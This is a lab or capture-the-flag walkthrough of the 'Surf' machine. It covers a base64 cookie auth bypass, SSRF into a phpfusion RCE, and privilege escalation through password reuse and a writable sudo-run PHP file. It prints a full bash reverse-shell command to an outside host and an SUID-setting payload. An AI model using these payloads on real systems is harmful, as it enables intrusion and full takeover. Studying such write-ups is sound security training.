---
icon: ubuntu
---

# Surf - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.231.171 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-06 22:34 EDT
Nmap scan report for 192.168.231.171
Host is up (0.033s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Surfing blog
|_http-server-header: Apache/2.4.38 (Debian)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   31.09 ms 192.168.45.1
2   30.94 ms 192.168.45.254
3   32.44 ms 192.168.251.1
4   35.30 ms 192.168.231.171
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (2519).png" alt=""><figcaption></figcaption></figure>

#### Directory Busting

```
dirsearch -u http://192.168.231.171/
```

<figure><img src="../../.gitbook/assets/image (2520).png" alt=""><figcaption></figcaption></figure>

Directory Busting reveals an administration page

<figure><img src="../../.gitbook/assets/image (2521).png" alt=""><figcaption></figcaption></figure>

Default credentials do not seem to work.

Reviewing the request in Burp, reveals some token

<figure><img src="../../.gitbook/assets/image (2522).png" alt=""><figcaption></figcaption></figure>

The `auth_status` cookie is just a base64 encoded `{'success':'false'}`

<figure><img src="../../.gitbook/assets/image (2523).png" alt=""><figcaption></figcaption></figure>

After the first attempt to login this cookie remains persistent!

<figure><img src="../../.gitbook/assets/image (2525).png" alt=""><figcaption></figcaption></figure>

We can overwrite it and make it say `{'success':'true'}`

<figure><img src="../../.gitbook/assets/image (2528).png" alt=""><figcaption></figcaption></figure>

Make sure to url encode the 2 = signs at the end

```
eydzdWNjZXNzJzondHJ1ZSd9%3D%3D
```

<figure><img src="../../.gitbook/assets/image (2529).png" alt=""><figcaption></figcaption></figure>

I'll replace the cookie and the console and try to login again with admin:admin and I'll have access

<figure><img src="../../.gitbook/assets/image (2530).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">SSRF → phpfusion RCE</mark>

<figure><img src="../../.gitbook/assets/image (2531).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2532).png" alt=""><figcaption></figcaption></figure>

After capturing the request in Burp and inspecting I saw the url parameter. I'll try to see if it reaches out to my machine

<figure><img src="../../.gitbook/assets/image (2533).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2534).png" alt=""><figcaption></figcaption></figure>

It does the check server function has potential for SSRF

<figure><img src="../../.gitbook/assets/image (2535).png" alt=""><figcaption></figcaption></figure>

Also the backend server seems to be running phpfusion.

<figure><img src="../../.gitbook/assets/image (2536).png" alt=""><figcaption></figcaption></figure>

Searchsploit has an RCE explout available. I am going to take a look at it

The exploit sends a base64 encoded payload to this endpoint

```
/infusions/downloads/downloads.php?cat_id=${system(base64_decode({}))}
```

We can’t run this exploit since we can’t access the server directly. I'll have to do it manually and take advantage of the ssrf to run system commands

I'll use the below command to get a reverse shell, and I'll base64 encode it

```
"bash -c  'bash  -i >& /dev/tcp/192.168.45.158/443 0>&1'  "
```

<figure><img src="../../.gitbook/assets/image (2537).png" alt=""><figcaption></figcaption></figure>

Now to put it all together

```
http://127.0.0.1:8080/infusions/downloads/downloads.php?cat_id=$\{system(base64_decode(YmFzaCAtYyAgJ2Jhc2ggIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDUuMTU4LzQ0MyAwPiYxJyAg)).exit\}
```

<figure><img src="../../.gitbook/assets/image (2538).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2539).png" alt=""><figcaption></figcaption></figure>

We got a shell as www-data

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (2541).png" alt=""><figcaption></figcaption></figure>

Besides root there is another user on the box. Let's see if we can find some creds for any of them

### <mark style="color:$primary;">Manual Enumeration</mark>

<figure><img src="../../.gitbook/assets/image (2540).png" alt=""><figcaption></figcaption></figure>

I found some database credentials let's see if there is any password reuse on this box

This password works for <mark style="color:$success;">**james:FlyToTheMoon213!**</mark>

<figure><img src="../../.gitbook/assets/image (2542).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2543).png" alt=""><figcaption></figcaption></figure>

james can run php on database-backup.php with sudo privileges

<figure><img src="../../.gitbook/assets/image (2544).png" alt=""><figcaption></figcaption></figure>

www-data owns that file! I am going to exit james and as www-data I'll replace the file with a php script that adds the SUID bit to /bin/bash

```
echo "<?php system('chmod +s /bin/bash')?>" > database-backup.php
```

<figure><img src="../../.gitbook/assets/image (2546).png" alt=""><figcaption></figcaption></figure>

And we got a shell as root!
